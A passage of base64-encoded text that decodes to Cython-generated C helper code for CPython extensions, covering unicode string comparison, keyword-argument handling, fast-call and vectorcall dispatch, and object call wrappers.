JldHVybiAtMTsKICAgICAgICAjZW5kaWYKICAgICAgICBpZiAobGVuZ3RoICE9IGxlbmd0aDIpIHsKICAgICAgICAgICAgZ290byByZXR1cm5fbmU7CiAgICAgICAgfQojaWYgQ1lUSE9OX1VTRV9VTklDT0RFX0lOVEVSTkFMUwogICAgICAgIHsKICAgICAgICAgICAgUHlfaGFzaF90IGhhc2gxLCBoYXNoMjsKICAgICAgICAgICAgaGFzaDEgPSAoKFB5QVNDSUlPYmplY3QqKXMxKS0+aGFzaDsKICAgICAgICAgICAgaGFzaDIgPSAoKFB5QVNDSUlPYmplY3QqKXMyKS0+aGFzaDsKICAgICAgICAgICAgaWYgKGhhc2gxICE9IGhhc2gyICYmIGhhc2gxICE9IC0xICYmIGhhc2gyICE9IC0xKSB7CiAgICAgICAgICAgICAgICBnb3RvIHJldHVybl9uZTsKICAgICAgICAgICAgfQogICAgICAgIH0KI2VuZGlmCiAgICAgICAga2luZCA9IF9fUHl4X1B5VW5pY29kZV9LSU5EKHMxKTsKICAgICAgICBpZiAoa2luZCAhPSBfX1B5eF9QeVVuaWNvZGVfS0lORChzMikpIHsKICAgICAgICAgICAgZ290byByZXR1cm5fbmU7CiAgICAgICAgfQogICAgICAgIGRhdGExID0gX19QeXhfUHlVbmljb2RlX0RBVEEoczEpOwogICAgICAgIGRhdGEyID0gX19QeXhfUHlVbmljb2RlX0RBVEEoczIpOwogICAgICAgIGlmIChfX1B5eF9QeVVuaWNvZGVfUkVBRChraW5kLCBkYXRhMSwgMCkgIT0gX19QeXhfUHlVbmljb2RlX1JFQUQoa2luZCwgZGF0YTIsIDApKSB7CiAgICAgICAgICAgIGdvdG8gcmV0dXJuX25lOwogICAgICAgIH0gZWxzZSBpZiAobGVuZ3RoID09IDEpIHsKICAgICAgICAgICAgZ290byByZXR1cm5fZXE7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgaW50IHJlc3VsdCA9IG1lbWNtcChkYXRhMSwgZGF0YTIsIChzaXplX3QpKGxlbmd0aCAqIGtpbmQpKTsKICAgICAgICAgICAgcmV0dXJuIChlcXVhbHMgPT0gUHlfRVEpID8gKHJlc3VsdCA9PSAwKSA6IChyZXN1bHQgIT0gMCk7CiAgICAgICAgfQogICAgfSBlbHNlIGlmICgoczEgPT0gUHlfTm9uZSkgJiBzMl9pc191bmljb2RlKSB7CiAgICAgICAgZ290byByZXR1cm5fbmU7CiAgICB9IGVsc2UgaWYgKChzMiA9PSBQeV9Ob25lKSAmIHMxX2lzX3VuaWNvZGUpIHsKICAgICAgICBnb3RvIHJldHVybl9uZTsKICAgIH0gZWxzZSB7CiAgICAgICAgaW50IHJlc3VsdDsKICAgICAgICBQeU9iamVjdCogcHlfcmVzdWx0ID0gUHlPYmplY3RfUmljaENvbXBhcmUoczEsIHMyLCBlcXVhbHMpOwogICAgICAgIGlmICghcHlfcmVzdWx0KQogICAgICAgICAgICByZXR1cm4gLTE7CiAgICAgICAgcmVzdWx0ID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKHB5X3Jlc3VsdCk7CiAgICAgICAgUHlfREVDUkVGKHB5X3Jlc3VsdCk7CiAgICAgICAgcmV0dXJuIHJlc3VsdDsKICAgIH0KcmV0dXJuX2VxOgogICAgcmV0dXJuIChlcXVhbHMgPT0gUHlfRVEpOwpyZXR1cm5fbmU6CiAgICByZXR1cm4gKGVxdWFscyA9PSBQeV9ORSk7CiNlbmRpZgp9CgoKI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICogX19QeXhfR2V0S3dWYWx1ZV9GQVNUQ0FMTChQeU9iamVjdCAqa3duYW1lcywgUHlPYmplY3QgKmNvbnN0ICprd3ZhbHVlcywgUHlPYmplY3QgKnMpCnsKICAgIFB5X3NzaXplX3QgaSwgbiA9IF9fUHl4X1B5VHVwbGVfR0VUX1NJWkUoa3duYW1lcyk7CiAgICAjaWYgIUNZVEhPTl9BU1NVTUVfU0FGRV9TSVpFCiAgICBpZiAodW5saWtlbHkobiA9PSAtMSkpIHJldHVybiBOVUxMOwogICAgI2VuZGlmCiAgICBmb3IgKGkgPSAwOyBpIDwgbjsgaSsrKQogICAgewogICAgICAgIFB5T2JqZWN0ICpuYW1laSA9IF9fUHl4X1B5VHVwbGVfR0VUX0lURU0oa3duYW1lcywgaSk7CiAgICAgICAgI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TCiAgICAgICAgaWYgKHVubGlrZWx5KCFuYW1laSkpIHJldHVybiBOVUxMOwogICAgICAgICNlbmRpZgogICAgICAgIGlmIChzID09IG5hbWVpKSByZXR1cm4ga3d2YWx1ZXNbaV07CiAgICB9CiAgICBmb3IgKGkgPSAwOyBpIDwgbjsgaSsrKQogICAgewogICAgICAgIFB5T2JqZWN0ICpuYW1laSA9IF9fUHl4X1B5VHVwbGVfR0VUX0lURU0oa3duYW1lcywgaSk7CiAgICAgICAgI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TCiAgICAgICAgaWYgKHVubGlrZWx5KCFuYW1laSkpIHJldHVybiBOVUxMOwogICAgICAgICNlbmRpZgogICAgICAgIGludCBlcSA9IF9fUHl4X1B5VW5pY29kZV9FcXVhbHMocywgbmFtZWksIFB5X0VRKTsKICAgICAgICBpZiAodW5saWtlbHkoZXEgIT0gMCkpIHsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KGVxIDwgMCkpIHJldHVybiBOVUxMOwogICAgICAgICAgICByZXR1cm4ga3d2YWx1ZXNbaV07CiAgICAgICAgfQogICAgfQogICAgcmV0dXJuIE5VTEw7Cn0KI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKQ1lUSE9OX1VOVVNFRCBzdGF0aWMgUHlPYmplY3QgKl9fUHl4X0t3YXJnc0FzRGljdF9GQVNUQ0FMTChQeU9iamVjdCAqa3duYW1lcywgUHlPYmplY3QgKmNvbnN0ICprd3ZhbHVlcykgewogICAgUHlfc3NpemVfdCBpLCBua3dhcmdzOwogICAgUHlPYmplY3QgKmRpY3Q7CiNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICAgIG5rd2FyZ3MgPSBQeVR1cGxlX1NpemUoa3duYW1lcyk7CiAgICBpZiAodW5saWtlbHkobmt3YXJncyA8IDApKSByZXR1cm4gTlVMTDsKI2Vsc2UKICAgIG5rd2FyZ3MgPSBQeVR1cGxlX0dFVF9TSVpFKGt3bmFtZXMpOwojZW5kaWYKICAgIGRpY3QgPSBQeURpY3RfTmV3KCk7CiAgICBpZiAodW5saWtlbHkoIWRpY3QpKQogICAgICAgIHJldHVybiBOVUxMOwogICAgZm9yIChpPTA7IGk8bmt3YXJnczsgaSsrKSB7CiNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUwogICAgICAgIFB5T2JqZWN0ICprZXkgPSBQeVR1cGxlX0dldEl0ZW0oa3duYW1lcywgaSk7CiAgICAgICAgaWYgKCFrZXkpIGdvdG8gYmFkOwojZWxzZQogICAgICAgIFB5T2JqZWN0ICprZXkgPSBQeVR1cGxlX0dFVF9JVEVNKGt3bmFtZXMsIGkpOwojZW5kaWYKICAgICAgICBpZiAodW5saWtlbHkoUHlEaWN0X1NldEl0ZW0oZGljdCwga2V5LCBrd3ZhbHVlc1tpXSkgPCAwKSkKICAgICAgICAgICAgZ290byBiYWQ7CiAgICB9CiAgICByZXR1cm4gZGljdDsKYmFkOgogICAgUHlfREVDUkVGKGRpY3QpOwogICAgcmV0dXJuIE5VTEw7Cn0KI2VuZGlmCiNlbmRpZgoKCnN0YXRpYyB2b2lkIF9fUHl4X1JhaXNlRG91YmxlS2V5d29yZHNFcnJvcigKICAgIGNvbnN0IGNoYXIqIGZ1bmNfbmFtZSwKICAgIFB5T2JqZWN0KiBrd19uYW1lKQp7CiAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLAogICAgICAgICIlcygpIGdvdCBtdWx0aXBsZSB2YWx1ZXMgZm9yIGtleXdvcmQgYXJndW1lbnQgJyVVJyIsIGZ1bmNfbmFtZSwga3dfbmFtZSk7Cn0KCgojaWYgQ1lUSE9OX0ZBU1RfUFlDQUxMICYmICFDWVRIT05fVkVDVE9SQ0FMTApzdGF0aWMgUHlPYmplY3QqIF9fUHl4X1B5RnVuY3Rpb25fRmFzdENhbGxOb0t3KFB5Q29kZU9iamVjdCAqY28sIFB5T2JqZWN0ICpjb25zdCAqYXJncywgUHlfc3NpemVfdCBuYSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqZ2xvYmFscykgewogICAgUHlGcmFtZU9iamVjdCAqZjsKICAgIFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSA9IF9fUHl4X1B5VGhyZWFkU3RhdGVfQ3VycmVudDsKICAgIFB5T2JqZWN0ICoqZmFzdGxvY2FsczsKICAgIFB5X3NzaXplX3QgaTsKICAgIFB5T2JqZWN0ICpyZXN1bHQ7CiAgICBhc3NlcnQoZ2xvYmFscyAhPSBOVUxMKTsKICAgIAogICAgYXNzZXJ0KHRzdGF0ZSAhPSBOVUxMKTsKICAgIGYgPSBQeUZyYW1lX05ldyh0c3RhdGUsIGNvLCBnbG9iYWxzLCBOVUxMKTsKICAgIGlmIChmID09IE5VTEwpIHsKICAgICAgICByZXR1cm4gTlVMTDsKICAgIH0KICAgIGZhc3Rsb2NhbHMgPSBfX1B5eF9QeUZyYW1lX0dldExvY2Fsc3BsdXMoZik7CiAgICBmb3IgKGkgPSAwOyBpIDwgbmE7IGkrKykgewogICAgICAgIFB5X0lOQ1JFRigqYXJncyk7CiAgICAgICAgZmFzdGxvY2Fsc1tpXSA9ICphcmdzKys7CiAgICB9CiAgICByZXN1bHQgPSBQeUV2YWxfRXZhbEZyYW1lRXgoZiwwKTsKICAgICsrdHN0YXRlLT5yZWN1cnNpb25fZGVwdGg7CiAgICBQeV9ERUNSRUYoZik7CiAgICAtLXRzdGF0ZS0+cmVjdXJzaW9uX2RlcHRoOwogICAgcmV0dXJuIHJlc3VsdDsKfQpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X1B5RnVuY3Rpb25fRmFzdENhbGxEaWN0KFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsIFB5X3NzaXplX3QgbmFyZ3MsIFB5T2JqZWN0ICprd2FyZ3MpIHsKICAgIFB5Q29kZU9iamVjdCAqY28gPSAoUHlDb2RlT2JqZWN0ICopUHlGdW5jdGlvbl9HRVRfQ09ERShmdW5jKTsKICAgIFB5T2JqZWN0ICpnbG9iYWxzID0gUHlGdW5jdGlvbl9HRVRfR0xPQkFMUyhmdW5jKTsKICAgIFB5T2JqZWN0ICphcmdkZWZzID0gUHlGdW5jdGlvbl9HRVRfREVGQVVMVFMoZnVuYyk7CiAgICBQeU9iamVjdCAqY2xvc3VyZTsKICAgIFB5T2JqZWN0ICprd2RlZnM7CiAgICBQeU9iamVjdCAqa3d0dXBsZSwgKiprOwogICAgUHlPYmplY3QgKipkOwogICAgUHlfc3NpemVfdCBuZDsKICAgIFB5X3NzaXplX3Qgbms7CiAgICBQeU9iamVjdCAqcmVzdWx0OwogICAgYXNzZXJ0KGt3YXJncyA9PSBOVUxMIHx8IFB5RGljdF9DaGVjayhrd2FyZ3MpKTsKICAgIG5rID0ga3dhcmdzID8gUHlEaWN0X1NpemUoa3dhcmdzKSA6IDA7CiAgICBpZiAodW5saWtlbHkoUHlfRW50ZXJSZWN1cnNpdmVDYWxsKCIgd2hpbGUgY2FsbGluZyBhIFB5dGhvbiBvYmplY3QiKSkpIHsKICAgICAgICByZXR1cm4gTlVMTDsKICAgIH0KICAgIGlmICgKICAgICAgICAgICAgY28tPmNvX2t3b25seWFyZ2NvdW50ID09IDAgJiYKICAgICAgICAgICAgbGlrZWx5KGt3YXJncyA9PSBOVUxMIHx8IG5rID09IDApICYmCiAgICAgICAgICAgIGNvLT5jb19mbGFncyA9PSAoQ09fT1BUSU1JWkVEIHwgQ09fTkVXTE9DQUxTIHwgQ09fTk9GUkVFKSkgewogICAgICAgIGlmIChhcmdkZWZzID09IE5VTEwgJiYgY28tPmNvX2FyZ2NvdW50ID09IG5hcmdzKSB7CiAgICAgICAgICAgIHJlc3VsdCA9IF9fUHl4X1B5RnVuY3Rpb25fRmFzdENhbGxOb0t3KGNvLCBhcmdzLCBuYXJncywgZ2xvYmFscyk7CiAgICAgICAgICAgIGdvdG8gZG9uZTsKICAgICAgICB9CiAgICAgICAgZWxzZSBpZiAobmFyZ3MgPT0gMCAmJiBhcmdkZWZzICE9IE5VTEwKICAgICAgICAgICAgICAgICAmJiBjby0+Y29fYXJnY291bnQgPT0gUHlfU0laRShhcmdkZWZzKSkgewogICAgICAgICAgICAKICAgICAgICAgICAgYXJncyA9ICZQeVR1cGxlX0dFVF9JVEVNKGFyZ2RlZnMsIDApOwogICAgICAgICAgICByZXN1bHQgPV9fUHl4X1B5RnVuY3Rpb25fRmFzdENhbGxOb0t3KGNvLCBhcmdzLCBQeV9TSVpFKGFyZ2RlZnMpLCBnbG9iYWxzKTsKICAgICAgICAgICAgZ290byBkb25lOwogICAgICAgIH0KICAgIH0KICAgIGlmIChrd2FyZ3MgIT0gTlVMTCkgewogICAgICAgIFB5X3NzaXplX3QgcG9zLCBpOwogICAgICAgIGt3dHVwbGUgPSBQeVR1cGxlX05ldygyICogbmspOwogICAgICAgIGlmIChrd3R1cGxlID09IE5VTEwpIHsKICAgICAgICAgICAgcmVzdWx0ID0gTlVMTDsKICAgICAgICAgICAgZ290byBkb25lOwogICAgICAgIH0KICAgICAgICBrID0gJlB5VHVwbGVfR0VUX0lURU0oa3d0dXBsZSwgMCk7CiAgICAgICAgcG9zID0gaSA9IDA7CiAgICAgICAgd2hpbGUgKFB5RGljdF9OZXh0KGt3YXJncywgJnBvcywgJmtbaV0sICZrW2krMV0pKSB7CiAgICAgICAgICAgIFB5X0lOQ1JFRihrW2ldKTsKICAgICAgICAgICAgUHlfSU5DUkVGKGtbaSsxXSk7CiAgICAgICAgICAgIGkgKz0gMjsKICAgICAgICB9CiAgICAgICAgbmsgPSBpIC8gMjsKICAgIH0KICAgIGVsc2UgewogICAgICAgIGt3dHVwbGUgPSBOVUxMOwogICAgICAgIGsgPSBOVUxMOwogICAgfQogICAgY2xvc3VyZSA9IFB5RnVuY3Rpb25fR0VUX0NMT1NVUkUoZnVuYyk7CiAgICBrd2RlZnMgPSBQeUZ1bmN0aW9uX0dFVF9LV19ERUZBVUxUUyhmdW5jKTsKICAgIGlmIChhcmdkZWZzICE9IE5VTEwpIHsKICAgICAgICBkID0gJlB5VHVwbGVfR0VUX0lURU0oYXJnZGVmcywgMCk7CiAgICAgICAgbmQgPSBQeV9TSVpFKGFyZ2RlZnMpOwogICAgfQogICAgZWxzZSB7CiAgICAgICAgZCA9IE5VTEw7CiAgICAgICAgbmQgPSAwOwogICAgfQogICAgcmVzdWx0ID0gUHlFdmFsX0V2YWxDb2RlRXgoKFB5T2JqZWN0KiljbywgZ2xvYmFscywgKFB5T2JqZWN0ICopTlVMTCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFyZ3MsIChpbnQpbmFyZ3MsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBrLCAoaW50KW5rLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZCwgKGludCluZCwga3dkZWZzLCBjbG9zdXJlKTsKICAgIFB5X1hERUNSRUYoa3d0dXBsZSk7CmRvbmU6CiAgICBQeV9MZWF2ZVJlY3Vyc2l2ZUNhbGwoKTsKICAgIHJldHVybiByZXN1bHQ7Cn0KI2VuZGlmCgoKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTgpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfQ2FsbChQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKmFyZywgUHlPYmplY3QgKmt3KSB7CiAgICBQeU9iamVjdCAqcmVzdWx0OwogICAgdGVybmFyeWZ1bmMgY2FsbCA9IFB5X1RZUEUoZnVuYyktPnRwX2NhbGw7CiAgICBpZiAodW5saWtlbHkoIWNhbGwpKQogICAgICAgIHJldHVybiBQeU9iamVjdF9DYWxsKGZ1bmMsIGFyZywga3cpOwogICAgaWYgKHVubGlrZWx5KFB5X0VudGVyUmVjdXJzaXZlQ2FsbCgiIHdoaWxlIGNhbGxpbmcgYSBQeXRob24gb2JqZWN0IikpKQogICAgICAgIHJldHVybiBOVUxMOwogICAgcmVzdWx0ID0gKCpjYWxsKShmdW5jLCBhcmcsIGt3KTsKICAgIFB5X0xlYXZlUmVjdXJzaXZlQ2FsbCgpOwogICAgaWYgKHVubGlrZWx5KCFyZXN1bHQpICYmIHVubGlrZWx5KCFQeUVycl9PY2N1cnJlZCgpKSkgewogICAgICAgIFB5RXJyX1NldFN0cmluZygKICAgICAgICAgICAgUHlFeGNfU3lzdGVtRXJyb3IsCiAgICAgICAgICAgICJOVUxMIHJlc3VsdCB3aXRob3V0IGVycm9yIGluIFB5T2JqZWN0X0NhbGwiKTsKICAgIH0KICAgIHJldHVybiByZXN1bHQ7Cn0KI2VuZGlmCgoKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTgpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhPKFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqYXJnKSB7CiAgICBQeU9iamVjdCAqc2VsZiwgKnJlc3VsdDsKICAgIFB5Q0Z1bmN0aW9uIGNmdW5jOwogICAgY2Z1bmMgPSBfX1B5eF9DeU9yUHlDRnVuY3Rpb25fR0VUX0ZVTkNUSU9OKGZ1bmMpOwogICAgc2VsZiA9IF9fUHl4X0N5T3JQeUNGdW5jdGlvbl9HRVRfU0VMRihmdW5jKTsKICAgIGlmICh1bmxpa2VseShQeV9FbnRlclJlY3Vyc2l2ZUNhbGwoIiB3aGlsZSBjYWxsaW5nIGEgUHl0aG9uIG9iamVjdCIpKSkKICAgICAgICByZXR1cm4gTlVMTDsKICAgIHJlc3VsdCA9IGNmdW5jKHNlbGYsIGFyZyk7CiAgICBQeV9MZWF2ZVJlY3Vyc2l2ZUNhbGwoKTsKICAgIGlmICh1bmxpa2VseSghcmVzdWx0KSAmJiB1bmxpa2VseSghUHlFcnJfT2NjdXJyZWQoKSkpIHsKICAgICAgICBQeUVycl9TZXRTdHJpbmcoCiAgICAgICAgICAgIFB5RXhjX1N5c3RlbUVycm9yLAogICAgICAgICAgICAiTlVMTCByZXN1bHQgd2l0aG91dCBlcnJvciBpbiBQeU9iamVjdF9DYWxsIik7CiAgICB9CiAgICByZXR1cm4gcmVzdWx0Owp9CiNlbmRpZgoKCiNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwMDAgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQpzdGF0aWMgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsX2ZhbGxiYWNrKFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqIGNvbnN0KmFyZ3MsIHNpemVfdCBuYXJncywgUHlPYmplY3QgKmt3YXJncykgewogICAgUHlPYmplY3QgKmFyZ3N0dXBsZTsKICAgIFB5T2JqZWN0ICpyZXN1bHQgPSAwOwogICAgc2l6ZV90IGk7CiAgICBhcmdzdHVwbGUgPSBQeVR1cGxlX05ldygoUHlfc3NpemVfdCluYXJncyk7CiAgICBpZiAodW5saWtlbHkoIWFyZ3N0dXBsZSkpIHJldHVybiBOVUxMOwogICAgZm9yIChpID0gMDsgaSA8IG5hcmdzOyBpKyspIHsKICAgICAgICBQeV9JTkNSRUYoYXJnc1tpXSk7CiAgICAgICAgaWYgKF9fUHl4X1B5VHVwbGVfU0VUX0lURU0oYXJnc3R1cGxlLCAoUHlfc3NpemVfdClpLCBhcmdzW2ldKSAhPSAoMCkpIGdvdG8gYmFkOwogICAgfQogICAgcmVzdWx0ID0gX19QeXhfUHlPYmplY3RfQ2FsbChmdW5jLCBhcmdzdHVwbGUsIGt3YXJncyk7CiAgYmFkOgogICAgUHlfREVDUkVGKGFyZ3N0dXBsZSk7CiAgICByZXR1cm4gcmVzdWx0Owp9CiNlbmRpZgojaWYgQ1lUSE9OX1ZFQ1RPUkNBTEwgJiYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAjaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDkwMDAwCiAgICAjZGVmaW5lIF9fUHl4X1B5VmVjdG9yY2FsbF9GdW5jdGlvbihjYWxsYWJsZSkgX1B5VmVjdG9yY2FsbF9GdW5jdGlvbihjYWxsYWJsZSkKICAjZWxpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04Kc3RhdGljIENZVEhPTl9JTkxJTkUgdmVjdG9yY2FsbGZ1bmMgX19QeXhfUHlWZWN0b3JjYWxsX0Z1bmN0aW9uKFB5T2JqZWN0ICpjYWxsYWJsZSkgewogICAgUHlUeXBlT2JqZWN0ICp0cCA9IFB5X1RZUEUoY2FsbGFibGUpOwogICAgI2lmIGRlZmluZWQoX19QeXhfQ3lGdW5jdGlvbl9VU0VEKQogICAgaWYgKF9fUHl4X0N5RnVuY3Rpb25fQ2hlY2tFeGFjdChjYWxsYWJsZSkpIHsKICAgICAgICByZXR1cm4gX19QeXhfQ3lGdW5jdGlvbl9mdW5jX3ZlY3RvcmNhbGwoY2FsbGFibGUpOwogICAgfQogICAgI2VuZGlmCiAgICBpZiAoIVB5VHlwZV9IYXNGZWF0dXJlKHRwLCBQeV9UUEZMQUdTX0hBVkVfVkVDVE9SQ0FMTCkpIHsKICAgICAgICByZXR1cm4gTlVMTDsKICAgIH0KICAgIGFzc2VydChQeUNhbGxhYmxlX0NoZWNrKGNhbGxhYmxlKSk7CiAgICBQeV9zc2l6ZV90IG9mZnNldCA9IHRwLT50cF92ZWN0b3JjYWxsX29mZnNldDsKICAgIGFzc2VydChvZmZzZXQgPiAwKTsKICAgIHZlY3RvcmNhbGxmdW5jIHB0cjsKICAgIG1lbWNweSgmcHRyLCAoY2hhciAqKSBjYWxsYWJsZSArIG9mZnNldCwgc2l6ZW9mKHB0cikpOwogICAgcmV0dXJuIHB0cjsKfQogICNlbHNlCiAgICAjZGVmaW5lIF9fUHl4X1B5VmVjdG9yY2FsbF9GdW5jdGlvbihjYWxsYWJsZSkgUHlWZWN0b3JjYWxsX0Z1bmN0aW9uKGNhbGxhYmxlKQogICNlbmRpZgojZW5kaWYKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsRGljdChQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBzaXplX3QgX25hcmdzLCBQeU9iamVjdCAqa3dhcmdzKSB7CiAgICBQeV9zc2l6ZV90IG5hcmdzID0gX19QeXhfUHlWZWN0b3JjYWxsX05BUkdTKF9uYXJncyk7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04KICAgIGlmIChuYXJncyA9PSAwICYmIGt3YXJncyA9PSBOVUxMKSB7CiAgICAgICAgaWYgKF9fUHl4X0N5T3JQeUNGdW5jdGlvbl9DaGVjayhmdW5jKSAmJiBsaWtlbHkoIF9fUHl4X0N5T3JQeUNGdW5jdGlvbl9HRVRfRkxBR1MoZnVuYykgJiBNRVRIX05PQVJHUykpCiAgICAgICAgICAgIHJldHVybiBfX1B5eF9QeU9iamVjdF9DYWxsTWV0aE8oZnVuYywgTlVMTCk7CiAgICB9CiAgICBlbHNlIGlmIChuYXJncyA9PSAxICYmIGt3YXJncyA9PSBOVUxMKSB7CiAgICAgICAgaWYgKF9fUHl4X0N5T3JQeUNGdW5jdGlvbl9DaGVjayhmdW5jKSAmJiBsaWtlbHkoIF9fUHl4X0N5T3JQeUNGdW5jdGlvbl9HRVRfRkxBR1MoZnVuYykgJiBNRVRIX08pKQogICAgICAgICAgICByZXR1cm4gX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhPKGZ1bmMsIGFyZ3NbMF0pOwogICAgfQojZW5kaWYKICAgICNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwODAwQjEKICAgICNpZiBDWVRIT05fRkFTVF9QWUNDQUxMCiAgICBpZiAoUHlDRnVuY3Rpb25fQ2hlY2soZnVuYykpIHsKICAgICAgICBpZiAoa3dhcmdzKSB7CiAgICAgICAgICAgIHJldHVybiBfUHlDRnVuY3Rpb25fRmFzdENhbGxEaWN0KGZ1bmMsIGFyZ3MsIG5hcmdzLCBrd2FyZ3MpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHJldHVybiBfUHlDRnVuY3Rpb25fRmFzdENhbGxLZXl3b3JkcyhmdW5jLCBhcmdzLCBuYXJncywgTlVMTCk7CiAgICAgICAgfQogICAgfQogICAgaWYgKCFrd2FyZ3MgJiYgX19QeXhfSVNfVFlQRShmdW5jLCAmUHlNZXRob2REZXNjcl9UeXBlKSkgewogICAgICAgIHJldHVybiBfUHlNZXRob2REZXNjcl9GYXN0Q2FsbEtleXdvcmRzKGZ1bmMsIGFyZ3MsIG5hcmdzLCBOVUxMKTsKICAgIH0KICAgICNlbmRpZgogICAgI2lmIENZVEhPTl9GQVNUX1BZQ0FMTAogICAgaWYgKFB5RnVuY3Rpb25fQ2hlY2soZnVuYykpIHsKICAgICAgICByZXR1cm4gX19QeXhfUHlGdW5jdGlvbl9GYXN0Q2FsbERpY3QoZnVuYywgYXJncywgbmFyZ3MsIGt3YXJncyk7CiAgICB9CiAgICAjZW5kaWYKICAgICNlbmRpZgogICAgaWYgKGt3YXJncyA9PSBOVUxMKSB7CiAgICAgICAgI2lmIENZVEhPTl9WRUNUT1JDQUxMICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICAgICAgdmVjdG9yY2FsbGZ1bmMgZiA9IF9fUHl4X1B5VmVjdG9yY2FsbF9GdW5jdGlvbihmdW5jKTsKICAgICAgICBpZiAoZikgewogICAgICAgICAgICByZXR1cm4gZihmdW5jLCBhcmdzLCBfbmFyZ3MsIE5VTEwpOwogICAgICAgIH0KICAgICAgICAjZWxpZiBkZWZpbmVkKF9fUHl4X0N5RnVuY3Rpb25fVVNFRCkgJiYgQ1lUSE9OX0JBQ0tQT1JUX1ZFQ1RPUkNBTEwKICAgICAgICBpZiAoX19QeXhfQ3lGdW5jdGlvbl9DaGVja0V4YWN0KGZ1bmMpKSB7CiAgICAgICAgICAgIF9fcHl4X3ZlY3RvcmNhbGxmdW5jIGYgPSBfX1B5eF9DeUZ1bmN0aW9uX2Z1bmNfdmVjdG9yY2FsbChmdW5jKTsKICAgICAgICAgICAgaWYgKGYpIHJldHVybiBmKGZ1bmMsIGFyZ3MsIF9uYXJncywgTlVMTCk7CiAgICAgICAgfQogICAgICAgICNlbGlmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgQ1lUSE9OX1ZFQ1RPUkNBTEwKICAgICAgICByZXR1cm4gUHlPYmplY3RfVmVjdG9yY2FsbChmdW5jLCBhcmdzLCBfbmFyZ3MsIE5VTEwpOwogICAgICAgICNlbmRpZgogICAgfQogICAgaWYgKG5hcmdzID09IDApIHsKICAgICAgICByZXR1cm4gX19QeXhfUHlPYmplY3RfQ2FsbChmdW5jLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV90dXBsZSwga3dhcmdzKTsKICAgIH0KICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDkwMDAwICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICByZXR1cm4gUHlPYmplY3RfVmVjdG9yY2FsbERpY3QoZnVuYywgYXJncywgKHNpemVfdCluYXJncywga3dhcmdzKTsKICAgICNlbHNlCiAgICByZXR1cm4gX19QeXhfUHlPYmplY3RfRmFzdENhbGxfZmFsbGJhY2soZnVuYywgYXJncywgKHNpemVfdCluYXJncywga3dhcmdzKTsKICAgICNlbmRpZgp9CgoKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA8IDB4MDMwQzAwMDAKc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9TZWxmbGVzc0NhbGwoUHlPYmplY3QgKm1ldGhvZCwgUHlPYmplY3QgKmFyZ3MsIFB5T2JqZWN0ICprd2FyZ3MpIHsKICAgIFB5T2JqZWN0ICpyZXN1bHQ7CiAgICBQeU9iamVjdCAqc2VsZmxlc3NfYXJncyA9IFB5VHVwbGVfR2V0U2xpY2UoYXJncywgMSwgUHlUdXBsZV9TaXplKGFyZ3MpKTsKICAgIGlmICh1bmxpa2VseSghc2VsZmxlc3NfYXJncykpIHJldHVybiBOVUxMOwogICAgcmVzdWx0ID0gUHlPYmplY3RfQ2FsbChtZXRob2QsIHNlbGZsZXNzX2FyZ3MsIGt3YXJncyk7CiAgICBQeV9ERUNSRUYoc2VsZmxlc3NfYXJncyk7CiAgICByZXR1cm4gcmVzdWx0Owp9CiNlbGlmIENZVEhP